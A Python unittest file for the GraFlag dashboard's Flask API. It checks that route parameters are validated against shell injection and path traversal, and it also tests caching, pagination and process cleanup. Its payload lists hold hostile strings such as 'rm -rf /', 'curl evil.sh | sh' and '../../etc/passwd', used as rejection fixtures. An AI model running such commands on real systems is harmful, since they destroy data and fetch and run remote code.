"""The web dashboard's HTTP surface.

`graflag gui` binds 0.0.0.0:5000 with no authentication and every route acts on
the manager as root -- including `rm -rf` of an experiment directory. Names
arriving over HTTP are interpolated into remote shell commands, so the only
thing between a request and the manager is `_valid_name()`.

None of that had a test. These cover the validation itself, and -- more
usefully -- assert that *every* route taking a path parameter validates it, so
a route added later without the check fails here rather than in production.
"""

import unittest
from unittest import mock


def _importable(name):
    try:
        __import__(name)
        return True
    except Exception:
        return False


HAVE_FLASK = _importable("flask") and _importable("flask_socketio")

# Payloads that must never reach a remote shell. Each is a real technique:
# command chaining, substitution, redirection, traversal, and the bare
# newline that ends a heredoc early.
INJECTIONS = [
    "exp; rm -rf /",
    "exp && curl evil.sh | sh",
    "exp`id`",
    "exp$(id)",
    "exp$USER",
    "../../etc/passwd",
    "..",
    "exp/../../root",
    "exp\nEOF\nrm -rf /",
    "exp with spaces",
    "exp'quote",
    'exp"quote',
    "exp|tee /tmp/x",
    "exp>/tmp/x",
    "",
    "x" * 201,          # over the 200-character cap
]

VALID_NAMES = [
    "exp__taddy__uci__20260115_142233",
    "bond_inj_cora",
    "ada_gad",
    "a",
    "x" * 200,
    "with.dots-and_underscores",
]


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class ValidName(unittest.TestCase):
    def test_rejects_every_injection_payload(self):
        from graflag.gui.server import _valid_name
        for payload in INJECTIONS:
            with self.subTest(payload=payload):
                self.assertFalse(_valid_name(payload))

    def test_accepts_the_names_graflag_actually_produces(self):
        from graflag.gui.server import _valid_name
        for name in VALID_NAMES:
            with self.subTest(name=name):
                self.assertTrue(_valid_name(name))

    def test_rejects_parent_traversal_even_when_otherwise_safe(self):
        """'..' passes the character class -- dots are legal in names -- so it
        needs its own check. Without it `experiments/../../etc` is a valid
        name made of legal characters."""
        from graflag.gui.server import _valid_name
        self.assertFalse(_valid_name(".."))
        self.assertFalse(_valid_name("a..b"))
        self.assertTrue(_valid_name("a.b"))

    def test_rejects_none_and_non_string(self):
        from graflag.gui.server import _valid_name
        self.assertFalse(_valid_name(None))


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class EveryParameterisedRouteValidates(unittest.TestCase):
    """A route that interpolates a name without checking it is the whole risk.

    Rather than list the routes, this walks Flask's URL map: any rule with a
    path parameter is exercised with an injection payload and must answer 400.
    A route added later without validation fails here.
    """

    def setUp(self):
        from graflag.gui import server
        self.server = server
        # api must exist: a route that rejects the name has to do so *before*
        # touching it. If validation is missing, the call reaches this mock and
        # the assertion below catches the 200/500 instead of a 400.
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()

    def tearDown(self):
        self.server.api = self._saved_api

    def _parameterised_rules(self):
        for rule in self.server.app.url_map.iter_rules():
            if not rule.arguments:
                continue
            if "static" in rule.endpoint:
                continue
            yield rule

    # Payloads without a '/'. Flask's default converter does not match a
    # slash, so a slash-bearing name 404s at routing and never reaches the
    # handler -- safe, but it tests the router rather than _valid_name.
    # These reach the handler and must be rejected there.
    HANDLER_PAYLOADS = [
        "evil; rm -rf .", "evil`id`", "evil$(id)", "evil$USER",
        "evil|sh", "evil with spaces", "evil'q", 'evil"q', "..", "a..b",
    ]

    def test_every_route_with_a_path_parameter_rejects_injection(self):
        for payload in self.HANDLER_PAYLOADS:
            self._assert_all_routes_reject(payload)

    def _assert_all_routes_reject(self, payload):
        checked = 0
        for rule in self._parameterised_rules():
            method = "POST" if "POST" in rule.methods else "GET"
            url = rule.rule
            for arg in rule.arguments:
                url = url.replace(f"<{arg}>", payload)
                url = url.replace(f"<string:{arg}>", payload)
            with self.subTest(endpoint=rule.endpoint, payload=payload):
                response = self.client.open(url, method=method)
                self.assertEqual(
                    response.status_code, 400,
                    f"{rule.endpoint} accepted {payload!r}: a name reaching "
                    "the manager unvalidated is interpolated into a root shell")
            checked += 1
        self.assertGreater(checked, 0, "no parameterised routes found -- "
                                       "the URL map walk is not working")

    def test_a_slash_bearing_name_never_reaches_a_handler(self):
        """Documents why the payloads above carry no slash: Flask's default
        converter stops at '/', so `/api/experiments/a/../../etc` is a 404 at
        routing. That is a second line of defence, not the one under test."""
        for rule in self._parameterised_rules():
            method = "POST" if "POST" in rule.methods else "GET"
            url = rule.rule
            for arg in rule.arguments:
                url = url.replace(f"<{arg}>", "a/../../etc")
                url = url.replace(f"<string:{arg}>", "a/../../etc")
            with self.subTest(endpoint=rule.endpoint):
                response = self.client.open(url, method=method)
                self.assertIn(response.status_code, (400, 404))

    def test_traversal_is_rejected_on_every_parameterised_route(self):  # noqa
        for rule in self._parameterised_rules():
            method = "POST" if "POST" in rule.methods else "GET"
            url = rule.rule
            for arg in rule.arguments:
                url = url.replace(f"<{arg}>", "..")
                url = url.replace(f"<string:{arg}>", "..")
            with self.subTest(endpoint=rule.endpoint):
                response = self.client.open(url, method=method)
                self.assertIn(response.status_code, (400, 404))


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class RunEndpoint(unittest.TestCase):
    def setUp(self):
        from graflag.gui import server
        self.server = server
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()

    def tearDown(self):
        self.server.api = self._saved_api

    def _post(self, payload):
        return self.client.post("/api/run", json=payload)

    def test_method_and_dataset_are_required(self):
        self.assertEqual(self._post({}).status_code, 400)
        self.assertEqual(self._post({"method": "taddy"}).status_code, 400)
        self.assertEqual(self._post({"dataset": "uci"}).status_code, 400)

    def test_injected_method_is_rejected(self):
        for payload in ("taddy; rm -rf /", "../../etc", "taddy`id`"):
            with self.subTest(payload=payload):
                r = self._post({"method": payload, "dataset": "uci"})
                self.assertEqual(r.status_code, 400)

    def test_injected_dataset_is_rejected(self):
        for payload in ("uci; rm -rf /", "..", "uci$(id)"):
            with self.subTest(payload=payload):
                r = self._post({"method": "taddy", "dataset": payload})
                self.assertEqual(r.status_code, 400)

    def test_rejection_happens_before_any_work_is_started(self):
        """A 400 that still spawned the background thread would have already
        reached the manager."""
        self._post({"method": "taddy; rm -rf /", "dataset": "uci"})
        self.server.api.run.assert_not_called()


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class SocketUpdateHandler(unittest.TestCase):
    def test_a_non_dict_payload_does_not_raise(self):
        """The handler does data.get('type'), so a client sending a string or
        null takes the server thread down with an AttributeError instead of
        being ignored."""
        from graflag.gui import server
        saved = server.api
        server.api = mock.MagicMock()
        try:
            for payload in (None, "all", 42, []):
                with self.subTest(payload=payload):
                    try:
                        server.handle_request_update(payload)
                    except AttributeError as exc:
                        self.fail(f"non-dict payload {payload!r} raised {exc}")
                    except Exception:
                        pass    # emit() outside a socket context is expected
        finally:
            server.api = saved


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class ExperimentListLimit(unittest.TestCase):
    """`/api/experiments` takes ?limit=, and the frontend never sends one.

    Two separate problems live here. A negative limit reaches
    `list_experiments(limit=-1)` and becomes a Python slice `[:-1]`, which
    silently returns every experiment but the last -- measured: 77 of 78.
    And the default of 50 truncates with nothing in the response saying so,
    so a dashboard showing 50 of 78 experiments looks complete.
    """

    def setUp(self):
        from graflag.gui import server
        self.server = server
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()

    def tearDown(self):
        self.server.api = self._saved_api

    def test_a_negative_limit_is_rejected_rather_than_silently_dropping_one(self):
        response = self.client.get("/api/experiments?limit=-1")
        self.assertEqual(
            response.status_code, 400,
            "limit=-1 reached list_experiments() and became a [:-1] slice, "
            "returning every experiment except the last")
        self.server.api.list_experiments.assert_not_called()

    def test_a_non_numeric_limit_falls_back_to_the_default(self):
        self.client.get("/api/experiments?limit=abc")
        self.server.api.list_experiments.assert_called_once_with(limit=50, offset=0)

    def test_an_explicit_limit_is_passed_through(self):
        self.client.get("/api/experiments?limit=200")
        self.server.api.list_experiments.assert_called_once_with(limit=200, offset=0)

    def test_zero_is_allowed_and_means_zero(self):
        """Distinct from negative: asking for none is a coherent request."""
        self.client.get("/api/experiments?limit=0")
        self.server.api.list_experiments.assert_called_once_with(limit=0, offset=0)


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class FrontendCallsRoutesThatExist(unittest.TestCase):
    """Every endpoint the dashboard's JavaScript fetches must be a real route.

    The frontend and the Flask app are edited independently, and a renamed or
    removed route shows up as a silent 404 in the browser -- an empty panel
    rather than an error -- because app.js does not check response.ok on every
    path. Comparing the two statically is the only cheap way to catch it.
    """

    JS = "graflag/gui/static/js"

    def _fetched_paths(self):
        """Every '/api/...' string the frontend passes to fetch()."""
        import re
        from pathlib import Path
        root = Path(__file__).resolve().parents[1] / self.JS
        paths = set()
        for js in root.rglob("*.js"):
            for match in re.finditer(r"""fetch\(\s*[`'"]([^`'"]+)""",
                                     js.read_text(errors="replace")):
                url = match.group(1)
                if url.startswith("/api"):
                    paths.add(url.split("?")[0])
        return paths

    def _route_matchers(self):
        """Flask rules as regexes, with <param> standing for one segment."""
        import re
        from graflag.gui import server
        matchers = []
        for rule in server.app.url_map.iter_rules():
            pattern = re.sub(r"<[^>]+>", "[^/]+", rule.rule)
            matchers.append((re.compile(f"^{pattern}$"), rule.rule))
        return matchers

    def test_every_fetched_api_path_matches_a_route(self):
        fetched = self._fetched_paths()
        self.assertTrue(fetched, "found no /api fetches in the frontend -- "
                                 "the extraction regex is not working")
        matchers = self._route_matchers()
        for url in sorted(fetched):
            # JS template holes (${name}) stand in for a path segment.
            probe = __import__("re").sub(r"\$\{[^}]+\}", "PLACEHOLDER", url)
            with self.subTest(url=url):
                self.assertTrue(
                    any(rx.match(probe) for rx, _ in matchers),
                    f"frontend fetches {url!r}, which matches no Flask route; "
                    "in the browser this is a silent 404")


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class PollingAndCaching(unittest.TestCase):
    """The dashboard's cost when nobody is looking, and on the hot path.

    Measured before these existed: /api/methods and /api/datasets cached
    380ms -> 0.8ms, while /api/experiments cost 437ms on *every* call and
    /api/cluster/info 240ms -- the two that the dashboard actually polls. The
    background updater meanwhile ran `while True: sleep(2)` with no client
    tracking at all, so an idle `graflag gui` hit the manager every two
    seconds forever.
    """

    def setUp(self):
        from graflag.gui import server
        self.server = server
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()
        for entry in server.cache.values():          # start cold
            entry["data"], entry["timestamp"] = None, 0
        server.connected_clients.clear()

    def tearDown(self):
        self.server.api = self._saved_api
        for entry in self.server.cache.values():
            entry["data"], entry["timestamp"] = None, 0
        self.server.connected_clients.clear()

    def test_experiments_are_cached_between_calls(self):
        self.server.api.list_experiments.return_value = []
        for _ in range(5):
            self.client.get("/api/experiments")
        self.assertEqual(
            self.server.api.list_experiments.call_count, 1,
            "the polled endpoint went to the manager on every request")

    def test_cluster_info_is_cached_between_calls(self):
        for _ in range(5):
            self.client.get("/api/cluster/info")
        self.assertEqual(self.server.api.get_cluster_info.call_count, 1)

    def test_a_different_limit_is_not_served_from_another_limits_cache(self):
        """Caching on the endpoint rather than the (endpoint, limit) pair
        would answer ?limit=100 with the 50 already cached."""
        self.server.api.list_experiments.return_value = []
        self.client.get("/api/experiments")
        self.client.get("/api/experiments?limit=100")
        self.assertEqual(self.server.api.list_experiments.call_count, 2)
        calls = {c.kwargs.get("limit") for c in
                 self.server.api.list_experiments.call_args_list}
        self.assertEqual(calls, {50, 100})

    def test_the_updater_does_no_work_with_no_clients_connected(self):
        self.server.should_poll = self.server.should_poll  # attribute exists
        self.assertFalse(
            self.server.should_poll(),
            "with no client connected the updater must not hit the manager")

    def test_the_updater_polls_once_a_client_connects(self):
        self.server.connected_clients.add("sid-1")
        self.assertTrue(self.server.should_poll())

    def test_a_write_invalidates_the_experiment_cache(self):
        """A run or delete changes the list; serving the pre-write cache for
        up to the TTL would show the dashboard a state that no longer exists."""
        self.server.api.list_experiments.return_value = []
        self.client.get("/api/experiments")
        self.client.post("/api/experiments/exp__a__b__c/delete")
        self.client.get("/api/experiments")
        self.assertEqual(self.server.api.list_experiments.call_count, 2)


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class SecretKey(unittest.TestCase):
    def test_secret_key_is_not_the_hardcoded_default(self):
        """A fixed secret committed to a repo signs every deployment's
        sessions with a value anyone can read."""
        import os
        from graflag.gui import server
        self.assertNotEqual(server.app.config["SECRET_KEY"],
                            "graflag-secret-key")
        self.assertTrue(server.app.config["SECRET_KEY"])


class LogFollowerDiesWithParent(unittest.TestCase):
    """`graflag run` follows logs with an ssh subprocess.

    Ctrl-C is handled -- KeyboardInterrupt terminates the child -- but SIGKILL
    cannot be caught, so a `timeout`-killed or `kill -9`-ed graflag orphaned
    the follower. Measured on this workstation before the fix: 162 orphaned
    `docker service logs -f` processes, the oldest 22 hours old, every one of
    them following a service that no longer existed.
    """

    def test_prctl_helper_sets_pdeathsig_and_never_raises(self):
        import signal as signal_mod
        from unittest import mock
        from graflag import docker_ops

        calls = []

        class FakeLibc:
            def prctl(self, *args):
                calls.append(args)
                return 0

        with mock.patch("ctypes.CDLL", return_value=FakeLibc()):
            docker_ops._die_with_parent()
        self.assertEqual(calls, [(1, signal_mod.SIGTERM)],
                         "PR_SET_PDEATHSIG(1) with SIGTERM was not requested")

    def test_helper_is_best_effort_on_platforms_without_prctl(self):
        """It runs between fork and exec: raising there would break the spawn
        on any system where prctl is unavailable."""
        from unittest import mock
        from graflag import docker_ops
        with mock.patch("ctypes.CDLL", side_effect=OSError("no libc")):
            docker_ops._die_with_parent()      # must not raise

    def test_every_long_lived_ssh_subprocess_is_guarded(self):
        """Both kinds leak: the log follower and the docker.sock tunnel.

        The first version of this test sliced from the string
        "docker service logs -f", which matched the new helper's own
        docstring and so happened to cover the tunnel too -- and caught it
        unguarded. Counting every Popen in the module is what was meant.
        """
        import inspect
        from graflag import docker_ops
        source = inspect.getsource(docker_ops)
        popens = source.count("subprocess.Popen(")
        guarded = source.count("preexec_fn=_die_with_parent")
        self.assertEqual(
            guarded, popens,
            f"{popens} Popen call(s) in docker_ops but {guarded} guarded: an "
            "unguarded long-lived ssh orphans when graflag is SIGKILL-ed")


class RemoteFollowerDiesWithTheConnection(unittest.TestCase):
    """The remote half of the log-follower leak.

    `_die_with_parent` kills the local ssh client when graflag is SIGKILL-ed,
    but sshd sends no SIGHUP to a remote command that has no TTY -- so
    `docker service logs -f` kept running on the manager after the client was
    gone. Measured: 158 of them alive inside the manager container, the oldest
    22 hours old, all following services that no longer existed. -tt is what
    closes that half.
    """

    def _follow_args(self):
        import inspect
        from graflag import docker_ops
        src = inspect.getsource(docker_ops.DockerManager.follow_service_logs)
        return src

    def test_follow_allocates_a_tty(self):
        self.assertIn("'-tt'", self._follow_args(),
                      "without -tt the remote `docker service logs -f` "
                      "survives the client and accumulates on the manager")

    def test_carriage_returns_are_stripped_from_captured_output(self):
        """-tt makes the stream CRLF; unstripped, every line written to
        method_output.txt carries a trailing \\r."""
        src = self._follow_args()
        self.assertIn("replace('\\r\\n', '\\n')", src)

    def test_the_stripping_actually_works(self):
        line = "2026-09-22 training epoch 1\r\n"
        cleaned = line.replace('\r\n', '\n').replace('\r', '')
        self.assertEqual(cleaned, "2026-09-22 training epoch 1\n")
        self.assertEqual(cleaned.rstrip('\n'), "2026-09-22 training epoch 1")


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class TruncationIsVisible(unittest.TestCase):
    """A dashboard showing 50 of 78 experiments must say so.

    The route defaulted to limit=50 and returned a bare JSON array, so a
    truncated list was indistinguishable from a complete one -- measured on
    this cluster as 50 shown against 78 on disk, with nothing anywhere
    indicating the other 28.
    """

    def setUp(self):
        from graflag.gui import server
        self.server = server
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()
        for entry in server.cache.values():
            entry["data"], entry["timestamp"] = None, 0

    def tearDown(self):
        self.server.api = self._saved_api
        for entry in self.server.cache.values():
            entry["data"], entry["timestamp"] = None, 0

    def _fake(self, n):
        items = []
        for i in range(n):
            e = mock.MagicMock()
            e.to_dict.return_value = {"name": f"exp__m__d__{i:04d}"}
            items.append(e)
        return items

    def test_response_reports_the_total_and_whether_it_truncated(self):
        self.server.api.list_experiments.return_value = self._fake(50)
        self.server.api.count_experiments.return_value = 78
        body = self.client.get("/api/experiments").get_json()
        self.assertIsInstance(body, dict,
                              "a bare array cannot carry the total")
        self.assertEqual(len(body["items"]), 50)
        self.assertEqual(body["total"], 78)
        self.assertTrue(body["truncated"])
        self.assertEqual(body["limit"], 50)

    def test_not_truncated_when_everything_fits(self):
        self.server.api.list_experiments.return_value = self._fake(12)
        self.server.api.count_experiments.return_value = 12
        body = self.client.get("/api/experiments").get_json()
        self.assertFalse(body["truncated"])
        self.assertEqual(body["total"], 12)

    def test_a_total_that_cannot_be_counted_does_not_break_the_list(self):
        """Counting is a second remote call; if it fails the list is still
        the thing the dashboard needs."""
        self.server.api.list_experiments.return_value = self._fake(3)
        self.server.api.count_experiments.side_effect = RuntimeError("ssh down")
        body = self.client.get("/api/experiments").get_json()
        self.assertEqual(len(body["items"]), 3)
        self.assertIsNone(body["total"])
        self.assertFalse(body["truncated"])


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class OffsetPagination(unittest.TestCase):
    """Server-side paging, so the client stops slicing a capped list.

    The dashboard paginated five at a time over whatever the API had returned
    -- itself capped at 50 of 78 -- so page 10 of 10 was the end of the cap,
    not the end of the data. An offset makes the page the server's idea of a
    page rather than the client's idea of a slice.
    """

    def setUp(self):
        from graflag.gui import server
        self.server = server
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()
        for entry in server.cache.values():
            entry["data"], entry["timestamp"] = None, 0

    def tearDown(self):
        self.server.api = self._saved_api
        for entry in self.server.cache.values():
            entry["data"], entry["timestamp"] = None, 0

    def _fake(self, n, start=0):
        out = []
        for i in range(start, start + n):
            e = mock.MagicMock()
            e.to_dict.return_value = {"name": f"exp__m__d__{i:04d}"}
            out.append(e)
        return out

    def test_offset_is_passed_through_and_reported(self):
        self.server.api.list_experiments.return_value = self._fake(5, start=10)
        self.server.api.count_experiments.return_value = 78
        body = self.client.get("/api/experiments?limit=5&offset=10").get_json()
        self.assertEqual(body["offset"], 10)
        self.assertEqual(body["limit"], 5)
        self.assertEqual(body["total"], 78)
        self.server.api.list_experiments.assert_called_once_with(limit=5, offset=10)

    def test_offset_defaults_to_zero(self):
        self.server.api.list_experiments.return_value = []
        self.server.api.count_experiments.return_value = 0
        body = self.client.get("/api/experiments").get_json()
        self.assertEqual(body["offset"], 0)

    def test_a_negative_offset_is_rejected(self):
        response = self.client.get("/api/experiments?offset=-5")
        self.assertEqual(response.status_code, 400)
        self.server.api.list_experiments.assert_not_called()

    def test_the_cache_is_keyed_on_the_offset_too(self):
        """Keying on the limit alone would answer page 3 with page 1."""
        self.server.api.list_experiments.return_value = []
        self.server.api.count_experiments.return_value = 0
        self.client.get("/api/experiments?limit=5&offset=0")
        self.client.get("/api/experiments?limit=5&offset=5")
        self.assertEqual(self.server.api.list_experiments.call_count, 2)


class CoreOffset(unittest.TestCase):
    def test_list_experiments_accepts_and_applies_an_offset(self):
        from unittest import mock as m
        from graflag.core import GraFlag
        g = GraFlag.__new__(GraFlag)
        g.ssh = m.MagicMock()
        g.config = m.MagicMock(remote_shared_dir="/shared")
        g.docker = m.MagicMock()
        g.docker.list_services.return_value = []
        rows = "".join(
            f"EXP:exp__m__d__2026010{i}_000000\nRESULTS:1\nEVAL:0\n"
            f"BUILD_LOG:0\nSTATUS_B64:\n" for i in range(1, 8))
        g.ssh.execute.return_value = m.MagicMock(
            returncode=0, stdout="TOTAL:7\n" + rows)
        first = g.list_experiments(limit=3, offset=0)
        second = g.list_experiments(limit=3, offset=3)
        self.assertEqual(len(first), 3)
        self.assertEqual(len(second), 3)
        self.assertNotEqual([e.name for e in first], [e.name for e in second],
                            "offset returned the same page")


class FrontendContract(unittest.TestCase):
    """Structural checks on the dashboard's JavaScript and template.

    The browser sandbox here cannot reach 127.0.0.1, so none of this was
    verifiable by rendering the page. These assert the things whose absence
    caused the bugs in the first place: a swallowed error, a blank table with
    three meanings, and a page that was a client slice of a capped list.
    """

    ROOT = None

    def setUp(self):
        from pathlib import Path
        self.ROOT = Path(__file__).resolve().parents[1] / "graflag" / "gui"

    def _read(self, *parts):
        return (self.ROOT.joinpath(*parts)).read_text(errors="replace")

    def test_no_loader_swallows_its_error_into_an_empty_list(self):
        """`catch { xs.value = [] }` is what made an unreachable cluster look
        like an empty one."""
        import re
        app = self._read("static", "js", "app.js")
        offenders = re.findall(
            r"catch\s*\([^)]*\)\s*\{[^}]*?\.value\s*=\s*\[\][^}]*?\}", app, re.S)
        self.assertEqual(
            offenders, [],
            "a loader still resets its data to [] on failure, which renders "
            "identically to a successful empty response")

    def test_the_template_has_an_error_surface(self):
        html = self._read("templates", "index.html")
        self.assertIn("connectionError", html,
                      "no connection banner: a failed fetch is invisible")
        self.assertIn('role="alert"', html)

    def test_panels_render_three_distinct_states(self):
        table = self._read("static", "js", "components", "DataTable.js")
        for state in ("'error'", "'loading'"):
            self.assertIn(state, table)
        self.assertIn("panel-state--empty", table)

    def test_every_data_table_is_given_its_panel_state(self):
        import re
        html = self._read("templates", "index.html")
        tags = re.findall(r"<data-table\b.*?>", html, re.S)
        self.assertTrue(tags, "no data-table usages found")
        for tag in tags:
            title = re.search(r'title="([^"]+)"', tag)
            with self.subTest(panel=title.group(1) if title else "?"):
                self.assertIn(":state=", tag,
                              "panel cannot distinguish empty from failed")

    def test_experiment_paging_is_server_side(self):
        app = self._read("static", "js", "app.js")
        self.assertIn("offset:", app,
                      "the page is still a client slice of a capped list")
        self.assertNotIn("experiments.value.slice(start, start + 5)", app)

    def test_log_polling_backs_off_and_stops_when_finished(self):
        app = self._read("static", "js", "app.js")
        self.assertNotIn("setInterval(fetchLogs", app,
                         "a fixed interval cannot back off")
        self.assertIn("MAX_DELAY", app)
        self.assertIn("TERMINAL", app)

    def test_datatable_does_not_reslice_a_server_side_page(self):
        table = self._read("static", "js", "components", "DataTable.js")
        self.assertIn("if (this.serverSide) return this.data;", table,
                      "a server-supplied page would be sliced again, showing "
                      "only the first itemsPerPage of it")

    def test_the_composable_does_not_import_a_second_vue(self):
        """index.html loads vue.global.js; an ESM import here would create a
        second runtime whose refs are not reactive in the app's tree."""
        import re
        src = self._read("static", "js", "composables", "useResource.js")
        # Actual import statements, not the word in a comment -- which is what
        # the first version of this test matched.
        imports = re.findall(r"^\s*import\s.+$", src, re.M)
        self.assertEqual([i for i in imports if "vue" in i.lower()], [],
                         "a second Vue runtime would make these refs inert")
        self.assertIn("const { ref } = Vue;", src)


@unittest.skipUnless(HAVE_FLASK, "flask/flask_socketio unavailable")
class ChangeSignalInvalidatesTheCache(unittest.TestCase):
    """A status change has to be visible on the refetch it triggers.

    The updater notices the change and tells clients to refetch, but the REST
    response is cached for EXPERIMENTS_TTL -- so the refetch was answered with
    exactly the data the updater had just decided was stale, and a status
    change did not show until the cache aged out on its own.
    """

    def setUp(self):
        from graflag.gui import server
        self.server = server
        self._saved_api = server.api
        server.api = mock.MagicMock()
        server.app.config["TESTING"] = True
        self.client = server.app.test_client()
        for entry in server.cache.values():
            entry["data"], entry["timestamp"] = None, 0

    def tearDown(self):
        self.server.api = self._saved_api
        for entry in self.server.cache.values():
            entry["data"], entry["timestamp"] = None, 0

    def test_invalidating_forces_the_next_request_to_refetch(self):
        self.server.api.list_experiments.return_value = []
        self.server.api.count_experiments.return_value = 0
        self.client.get("/api/experiments")
        self.client.get("/api/experiments")
        self.assertEqual(self.server.api.list_experiments.call_count, 1)

        self.server.invalidate_experiments_cache()
        self.client.get("/api/experiments")
        self.assertEqual(
            self.server.api.list_experiments.call_count, 2,
            "the refetch after a change signal was served from the cache the "
            "change had just invalidated")

    def test_the_updater_invalidates_before_it_broadcasts(self):
        """Order matters: announcing first races the client's refetch against
        the invalidation."""
        import inspect
        src = inspect.getsource(self.server.background_updater)
        self.assertIn("invalidate_experiments_cache()", src)
        self.assertLess(
            src.index("invalidate_experiments_cache()"),
            src.index("broadcast_update('experiments_changed'"),
            "the broadcast happens before the cache is dropped")
